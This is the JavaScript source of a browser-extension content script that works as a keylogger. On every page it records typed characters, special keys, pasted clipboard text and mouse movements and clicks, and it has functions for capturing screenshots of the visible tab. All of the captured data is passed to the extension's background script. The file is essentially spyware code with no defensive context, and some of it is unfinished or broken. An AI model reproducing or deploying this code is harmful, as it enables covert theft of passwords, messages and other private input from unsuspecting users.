"use strict";

//capturing the keystrokes
window.addEventListener("keypress", logkeypress, false);
window.addEventListener("keydown", logkeydown, false);
window.addEventListener("paste", handlepasteevent, false);
window.addEventListener("mousemove", logMouseMove, false);
window.addEventListener("mousedown", logMouseDown, false);

function dateToString(date) {
	let month = date.getMonth() + 1;
	let day = date.getDate();
	let dateOfString = (("" + day).length < 2 ? "0" : "") + day + "/";
	dateOfString += (("" + month).length < 2 ? "0" : "") + month + "/";
	dateOfString += date.getFullYear();
	let hour = date.getHours();
	let minute = date.getMinutes();
	let second = date.getSeconds();
	dateOfString += " " + (("" + hour).length < 2 ? "0" : "") + hour + ":";
	dateOfString += (("" + minute).length < 2 ? "0" : "") + minute + ":";
	dateOfString += (("" + second).length < 2 ? "0" : "") + second;
	
}

function handlepasteevent(e) {
	// Get pasted data via clipboard API
    let clipboardData = e.clipboardData || window.clipboardData;
	let pastedData = clipboardData.getData('Text');
	if(pastedData!="") {
		chrome.runtime.sendMessage({action: "keylog", data: pastedData});
	}
}

function logMouseMove(e) {
	let currentdate = Date.now();
	 chrome.runtime.sendMessage({action: "mouselog",data : currentdate+':('+e.pageX+','+e.pageY+')'});
}

function logMouseDown(e) {
	// try {
	// 	chrome.tabs.captureVisibleTab(window.Window.id, {}, function(image) {
	// 		chrome.runtime.sendMessage({action:"imglog", data: 'gotchaaaaaaa'});
	// 	});
	// } catch(err) {
	// 	chrome.runtime.sendMessage({action :"erreur", data: err});
	// }
	
	let currentdate = Date.now();
	 chrome.runtime.sendMessage({action: "mouselog",data :currentdate+':['+e.pageX+','+e.pageY+']'});
}

function logkeydown(e) {

	let keynum;

	keynum = e.which;

	let keypressed="";
	switch(keynum) {
		case  8: keypressed = "<backspace>"; break; //  backspace
		case  9: keypressed = "<tab>"; break; //  tab
		case  13: keypressed = "<enter>"; break; //  enter
		case  16: keypressed = "<shift>"; break; //  shift
		case  17: keypressed = "<ctrl>"; break; //  ctrl
		case  18: keypressed = "<alt>"; break; //  alt
		case  20: keypressed = "<caps lock>"; break; //  alt
		case  27: keypressed = "<escape>"; break; //  escape
		case  32: keypressed = "<blank>"; break; // left arrow	
		case  37: keypressed = "<left arrow>"; break; // left arrow	
		case  39: keypressed = "<right arrow>"; break; // right arrow
		case  45: keypressed = "<insert>"; break; // insert	
		case  46: keypressed = "<delete>"; break; // delete
	}

	if(keypressed!="") {
		chrome.runtime.sendMessage({action: "keylog", data: keypressed});
	}
}


function logkeypress(e) {

	let keynum;

	keynum = e.which;

	let keypressed="";

	switch(keynum) {
		case 0: break; // break if escape, tab, delete etc	 
		case 8: break; //  backspace
		case 9: break; //  tab
		case 13: break; //  enter
		case 16: break; //  shift
		case 17: break; //  ctrl
		case 18: break; //  alt
		case 20: break; //  alt
		case 27: break; //  escape
		case 32: break; // blank
		case 37: break; // left arrow	
		case 39: break; // right arrow
		case 45: break; // insert	
		case 46: break; // delete
		default:
			keypressed = String.fromCharCode(keynum);
			chrome.runtime.sendMessage({action: "keylog", data: keypressed});
	}	
}


function screenshot() {
	var capturing = browser.tabs.captureVisibleTab();
	capturing.then(onCaptured, onError);
	
}

function onCaptured(imageURI) {
	chrome.runtime.sendMessage({action: "imglog", data: imageURI});
}

function onError(error) {
	chrome.runtime.sendMessage({action:'imgerr', data: error});
}